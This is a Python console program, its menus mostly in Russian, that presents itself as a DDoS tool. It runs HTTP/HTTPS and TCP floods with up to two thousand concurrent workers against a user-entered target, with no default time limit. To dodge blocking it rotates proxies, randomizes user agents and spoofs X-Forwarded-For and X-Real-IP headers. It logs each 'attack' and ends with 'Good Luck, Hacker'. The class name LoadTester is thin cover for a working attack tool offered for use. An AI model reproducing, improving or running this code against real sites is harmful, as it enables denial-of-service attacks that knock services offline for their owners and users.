import os
import sys
import time
import random
import json
import asyncio
import aiohttp
import socket
import logging
from datetime import datetime

# ================= CONSOLE SETUP =================
os.system('mode con: cols=120 lines=40')
os.system('color 0F')

# ================= LOGGER =================
log_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(log_dir, "ultra.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= COLORS (как в оригинале) =================
Reset = "\033[0m"
Red = "\033[1;31m"
Green = "\033[1;33m"      # жёлтый
Blue = "\033[1;34m"
Grey = "\033[1;30m"
Purple = "\033[0;35m"

g = "\033[1;32m"          # зелёный
r = "\033[1;31m"
w = "\033[0m"
b = "\033[1;34m"
o = "\033[1;33m"          # жёлтый
bl = "\033[1;36;40m"

# ================= БАННЕР (как в оригинале) =================
def banner():
    print(f"""
{Green}Version
{Green}v1.1.0realise

{Green}Developer:{w} verifactor @newince

{Green}While IP
{Green}Target

{Green}While the Port:{w} 8888

{Green}Launch DDoS{w}please wait a few seconds
{Reset}
""")

# ================= КОНФИГ =================
CONFIG = {
    "max_threads": 1000,
    "timeout": 3,
    "max_duration": 0,
    "proxy_rotation_interval": 10
}

# ================= СТАТИСТИКА =================
def load_stats():
    try:
        with open('stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"attacks": 0, "requests": 0, "success": 0, "errors": 0}

def save_stats(s):
    try:
        with open('stats.json', 'w') as f:
            json.dump(s, f, indent=4)
    except:
        pass

def save_history(entry):
    try:
        with open('history.json', 'r') as f:
            h = json.load(f)
    except:
        h = []
    h.append(entry)
    if len(h) > 100:
        h = h[-100:]
    try:
        with open('history.json', 'w') as f:
            json.dump(h, f, indent=4)
    except:
        pass

def load_history():
    try:
        with open('history.json', 'r') as f:
            return json.load(f)
    except:
        return []

# ================= PROXY =================
async def check_proxy(p):
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            async with s.get('http://httpbin.org/ip', proxy=p) as r:
                return r.status == 200
    except:
        return False

# ================= TCP =================
async def tcp_flood(ip, port):
    try:
        r, w = await asyncio.open_connection(ip, port)
        for _ in range(5):
            w.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            await w.drain()
        w.close()
        await w.wait_closed()
        return True
    except:
        return False

# ================= SAFE INPUT =================
def safe_int(prompt, default=100, min_val=1, max_val=1000):
    while True:
        u = input(prompt)
        if u == "":
            return default
        try:
            v = int(u)
            if min_val <= v <= max_val:
                return v
        except:
            pass

# ================= LOAD TESTER =================
class LoadTester:
    def __init__(self):
        self.running = False
        self.requests = 0
        self.success = 0
        self.errors = 0
        self.banned = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.session = None
        self.proxies = []
        self.idx = 0
        self.lock = asyncio.Lock()

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                self.proxies = [l.strip() for l in f if l.strip()]
            return len(self.proxies)
        except:
            return 0

    def next_proxy(self):
        if not self.proxies:
            return None
        p = self.proxies[self.idx]
        self.idx = (self.idx + 1) % len(self.proxies)
        return p

    async def http_test(self, url):
        try:
            if self.session is None or self.session.closed:
                connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=60)
                timeout = aiohttp.ClientTimeout(total=CONFIG["timeout"])
                self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

            proxy = self.next_proxy() if self.proxies else None

            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/121.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0',
                ]),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            if self.banned > 0 and self.banned % CONFIG["proxy_rotation_interval"] == 0:
                self.idx = random.randint(0, len(self.proxies) - 1) if self.proxies else 0
                await asyncio.sleep(0.5)

            async with self.session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                body = await resp.read()
                async with self.lock:
                    self.requests += 1
                    self.bytes_sent += len(body)
                    if resp.status in [200, 301, 302, 404]:
                        self.success += 1
                    elif resp.status in [403, 429, 503]:
                        self.banned += 1
                        self.errors += 1
                    else:
                        self.errors += 1
        except:
            async with self.lock:
                self.requests += 1
                self.errors += 1

    async def start_http(self, url, threads):
        self.running = True
        self.requests = self.success = self.errors = self.banned = self.bytes_sent = 0
        self.start_time = time.time()
        self.load_proxies()

        sem = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with sem:
                    await self.http_test(url)
                    await asyncio.sleep(random.uniform(0.0005, 0.005))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    async def start_tcp(self, target, threads):
        try:
            ip = target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            port = 443 if target.startswith('https://') else 80
        except:
            return

        self.running = True
        self.requests = self.success = self.errors = self.banned = 0
        self.start_time = time.time()
        self.load_proxies()

        sem = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with sem:
                    if await tcp_flood(ip, port):
                        async with self.lock:
                            self.requests += 1
                            self.success += 1
                    else:
                        async with self.lock:
                            self.requests += 1
                            self.errors += 1
                    await asyncio.sleep(random.uniform(0.001, 0.01))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    def stop(self):
        self.running = False
        if self.session:
            asyncio.create_task(self.session.close())

# ================= UI =================
class UI:
    def __init__(self):
        self.running = True
        self.menu = 'main'
        self.tester = LoadTester()

    def clear(self):
        os.system('cls')

    def header(self):
        banner()

    def main_menu(self):
        self.clear()
        self.header()
        print(f"""
{Green}ГЛАВНОЕ МЕНЮ

{Green}1.{w} DDos Ip Address
{Green}2.{w} View Url Ip Address
{Green}3.{w} DDos site logs
{Green}4.{w} Proxy Management
{Green}5.{w} Total Statistics
{Green}6.{w} History
{Green}7.{w} Settings
{Green}8.{w} INFO — инструкция по использованию
{Green}99.{w} Exit
{Reset}
""")

    def info_menu(self):
        self.clear()
        self.header()
        print(f"""
{Green}ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ

{Green}1.{w} DDOS IP ADDRESS — HTTP/HTTPS флуд по IP
{Green}2.{w} VIEW URL IP ADDRESS — TCP-флуд по URL
{Green}3.{w} DDOS SITE LOGS — логи атак
{Green}4.{w} PROXY MANAGEMENT — управление прокси
{Green}5.{w} TOTAL STATISTICS — общая статистика
{Green}6.{w} HISTORY — история атак
{Green}7.{w} SETTINGS — настройки
{Green}8.{w} INFO — эта инструкция
{Green}99.{w} EXIT — выход
{Reset}
""")
        input(f"{Green}Нажми ENTER для возврата...{Reset}")

    def settings_menu(self):
        global CONFIG
        self.clear()
        self.header()
        print(f"""
{Green}НАСТРОЙКИ

{Green}1.{w} Max Threads : {CONFIG['max_threads']}
{Green}2.{w} Timeout     : {CONFIG['timeout']}s
{Green}3.{w} Max Duration: {CONFIG['max_duration']}s
{Green}4.{w} Proxy Rot.  : {CONFIG['proxy_rotation_interval']}
{Green}99.{w} Назад
{Reset}
""")
        choice = input(f"{Green}Выбери: {w}")
        if choice == '1':
            v = safe_int(f"{Green}Max Threads (100-2000): {w}", 1000, 100, 2000)
            CONFIG['max_threads'] = v
        elif choice == '2':
            while True:
                v = input(f"{Green}Timeout (0.5-10): {w}")
                try:
                    v = float(v)
                    if 0.5 <= v <= 10:
                        CONFIG['timeout'] = v
                        break
                except:
                    pass
        elif choice == '3':
            v = safe_int(f"{Green}Max Duration (0 = no limit): {w}", 0, 0, 99999)
            CONFIG['max_duration'] = v
        elif choice == '4':
            v = safe_int(f"{Green}Proxy Rotation (5-100): {w}", 10, 5, 100)
            CONFIG['proxy_rotation_interval'] = v
        elif choice == '99':
            return
        self.settings_menu()

    def history_menu(self):
        self.clear()
        self.header()
        h = load_history()
        print(f"{Green}ИСТОРИЯ (последние 10){Reset}")
        if not h:
            print(f"{Green}Нет записей{Reset}")
        else:
            for i, e in enumerate(h[-10:], 1):
                t = e.get('target', 'N/A')[:25]
                r = e.get('requests', 0)
                ts = e.get('timestamp', '')[:16]
                print(f"{Green}{i}.{w} {t}  {Green}{r} req{w}  {Green}{ts}{Reset}")
        input(f"{Green}Нажми ENTER...{Reset}")

    def stats_menu(self):
        self.clear()
        self.header()
        s = load_stats()
        print(f"""
{Green}ОБЩАЯ СТАТИСТИКА

{Green}Атак    : {w}{s['attacks']}
{Green}Запросов: {w}{s['requests']:,}
{Green}Успешно : {w}{s['success']:,}
{Green}Ошибок  : {w}{s['errors']:,}
{Reset}
""")
        input(f"{Green}Нажми ENTER...{Reset}")

    def logs_menu(self):
        self.clear()
        self.header()
        s = load_stats()
        print(f"""
{Green}ЛОГИ СИСТЕМЫ

{Green}Всего атак    : {w}{s['attacks']}
{Green}Всего запросов: {w}{s['requests']:,}
{Green}Всего успешно : {w}{s['success']:,}
{Green}Всего ошибок  : {w}{s['errors']:,}
{Reset}
""")
        input(f"{Green}Нажми ENTER...{Reset}")

    def proxy_menu(self):
        self.clear()
        self.header()
        try:
            with open('proxies.txt', 'r') as f:
                proxies = [l.strip() for l in f if l.strip()]
        except:
            proxies = []
        print(f"""
{Green}УПРАВЛЕНИЕ ПРОКСИ

{Green}1.{w} Добавить прокси вручную
{Green}2.{w} Загрузить из файла
{Green}3.{w} Показать список ({len(proxies)})
{Green}4.{w} Очистить список
{Green}5.{w} Проверить все прокси
{Green}99.{w} Назад
{Reset}
""")
        choice = input(f"{Green}Выбери: {w}")
        if choice == '1':
            p = input(f"{Green}Прокси (http://ip:port): {w}")
            if p:
                with open('proxies.txt', 'a') as f:
                    f.write(p + '\n')
                print(f"{Green}[OK] Добавлен{Reset}")
        elif choice == '2':
            try:
                with open('proxies.txt', 'r') as f:
                    cnt = len([l for l in f if l.strip()])
                print(f"{Green}[OK] Загружено {cnt}{Reset}")
            except:
                print(f"{Red}[!] Файл не найден{Reset}")
        elif choice == '3':
            if proxies:
                print(f"\n{Green}Список:{Reset}")
                for i, p in enumerate(proxies, 1):
                    print(f"{Green}{i}. {w}{p}{Reset}")
            else:
                print(f"{Red}[!] Пусто{Reset}")
            input(f"{Green}Нажми ENTER...{Reset}")
        elif choice == '4':
            open('proxies.txt', 'w').close()
            print(f"{Green}[OK] Очищено{Reset}")
        elif choice == '5':
            print(f"{Green}[!] Проверка...{Reset}")
            async def check():
                valid = []
                for p in proxies:
                    if await check_proxy(p):
                        valid.append(p)
                return valid
            if proxies:
                valid = asyncio.run(check())
                with open('proxies.txt', 'w') as f:
                    f.write('\n'.join(valid))
                print(f"{Green}[OK] Работает: {len(valid)}/{len(proxies)}{Reset}")
            time.sleep(1)
        elif choice == '99':
            return
        self.proxy_menu()

    def attack_progress(self, url, threads, t):
        elapsed = int(time.time() - t.start_time)
        rate = int(t.requests / elapsed) if elapsed > 0 else 0
        load = min(100, int(rate / 15))
        bar = '█' * (load // 2) + '░' * (50 - load // 2)
        
        self.clear()
        self.header()
        print(f"""
{Green}АТАКА В ПРОЦЕССЕ

{Green}Цель   : {w}{url[:30]}
{Green}Потоки : {w}{threads}
{Green}Запросы: {w}{t.requests:,}
{Green}Скорость: {w}{rate:,} r/s
{Green}Успешно: {w}{t.success:,}
{Green}Ошибки : {w}{t.errors:,}
{Green}Бан    : {w}{t.banned}
{Green}Нагрузка: {w}[{bar}] {load}%
{Green}Время   : {w}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}
{Green}Данные  : {w}{t.bytes_sent/1024/1024:.1f} MB
{Green}[Press ENTER to stop]
{Reset}
""")

    def handle(self, choice):
        if self.menu == 'main':
            if choice == '1':
                asyncio.run(self.http_test())
            elif choice == '2':
                asyncio.run(self.tcp_test())
            elif choice == '3':
                self.menu = 'logs'
            elif choice == '4':
                self.menu = 'proxy'
            elif choice == '5':
                self.menu = 'stats'
            elif choice == '6':
                self.menu = 'history'
            elif choice == '7':
                self.menu = 'settings'
            elif choice == '8':
                self.menu = 'info'
            elif choice == '99':
                self.running = False
        elif choice.lower() == 'back':
            self.menu = 'main'

    async def http_test(self):
        self.clear()
        self.header()
        print(f"{Green}HTTP НАГРУЗКА — HTTP/HTTPS Flood{Reset}")
        
        url = input(f"{Green}Цель: {w}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_int(f"{Green}Потоки (1-{CONFIG['max_threads']}): {w}", 100, 1, CONFIG['max_threads'])
        
        t = LoadTester()
        task = asyncio.create_task(t.start_http(url, threads))
        
        while t.running:
            self.attack_progress(url, threads, t)
            await asyncio.sleep(0.3)
        
        t.stop()
        await task
        
        elapsed = int(time.time() - t.start_time)
        entry = {
            "target": url, "threads": threads, "duration": elapsed,
            "requests": t.requests, "success": t.success, "errors": t.errors,
            "banned": t.banned, "bytes_sent": t.bytes_sent,
            "avg_rate": int(t.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
        save_history(entry)
        s = load_stats()
        s["attacks"] += 1
        s["requests"] += t.requests
        s["success"] += t.success
        s["errors"] += t.errors
        save_stats(s)
        
        self.clear()
        self.header()
        print(f"""
{Green}АТАКА ЗАВЕРШЕНА

{Green}Запросы: {w}{t.requests:,}
{Green}Успешно: {w}{t.success:,}
{Green}Ошибки : {w}{t.errors:,}
{Green}Бан    : {w}{t.banned}
{Green}Время  : {w}{elapsed} сек
{Green}Скорость: {w}{int(t.requests/elapsed) if elapsed>0 else 0} r/s
{Reset}
""")
        input(f"{Green}Нажми ENTER...{Reset}")

    async def tcp_test(self):
        self.clear()
        self.header()
        print(f"{Green}TCP НАГРУЗКА — TCP Flood{Reset}")
        
        url = input(f"{Green}Цель: {w}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_int(f"{Green}Потоки (1-{CONFIG['max_threads']}): {w}", 100, 1, CONFIG['max_threads'])
        
        t = LoadTester()
        task = asyncio.create_task(t.start_tcp(url, threads))
        
        while t.running:
            self.attack_progress(url, threads, t)
            await asyncio.sleep(0.3)
        
        t.stop()
        await task
        
        elapsed = int(time.time() - t.start_time)
        entry = {
            "target": url, "threads": threads, "duration": elapsed,
            "requests": t.requests, "success": t.success, "errors": t.errors,
            "banned": t.banned, "bytes_sent": t.bytes_sent,
            "avg_rate": int(t.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
        save_history(entry)
        s = load_stats()
        s["attacks"] += 1
        s["requests"] += t.requests
        s["success"] += t.success
        s["errors"] += t.errors
        save_stats(s)
        
        self.clear()
        self.header()
        print(f"""
{Green}АТАКА ЗАВЕРШЕНА

{Green}Запросы: {w}{t.requests:,}
{Green}Успешно: {w}{t.success:,}
{Green}Ошибки : {w}{t.errors:,}
{Green}Бан    : {w}{t.banned}
{Green}Время  : {w}{elapsed} сек
{Green}Скорость: {w}{int(t.requests/elapsed) if elapsed>0 else 0} r/s
{Reset}
""")
        input(f"{Green}Нажми ENTER...{Reset}")

    def render(self):
        if self.menu == 'main':
            self.main_menu()
        elif self.menu == 'info':
            self.info_menu()
        elif self.menu == 'settings':
            self.settings_menu()
        elif self.menu == 'history':
            self.history_menu()
        elif self.menu == 'stats':
            self.stats_menu()
        elif self.menu == 'logs':
            self.logs_menu()
        elif self.menu == 'proxy':
            self.proxy_menu()

    def run(self):
        try:
            while self.running:
                self.render()
                choice = input(f"\n{Green}┌─ {Green}Input{Green} ─────────────────────────────────┐\n{Green}│{Reset} > {w}").strip()
                print(f"{Reset}\n")
                self.handle(choice)
        except KeyboardInterrupt:
            self.clear()
            print(f"""
{Green}
╔═══════════════════════════════════════════════════════════╗
║        TERMINATING NEURAL LINK...                        ║
║        System Standby Mode Activated                     ║
║        Good Luck, Hacker.                                ║
╚═══════════════════════════════════════════════════════════╝
{Green}[ErrorCode404] Session Ended - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Reset}
""")

if __name__ == '__main__':
    ui = UI()
    ui.run()
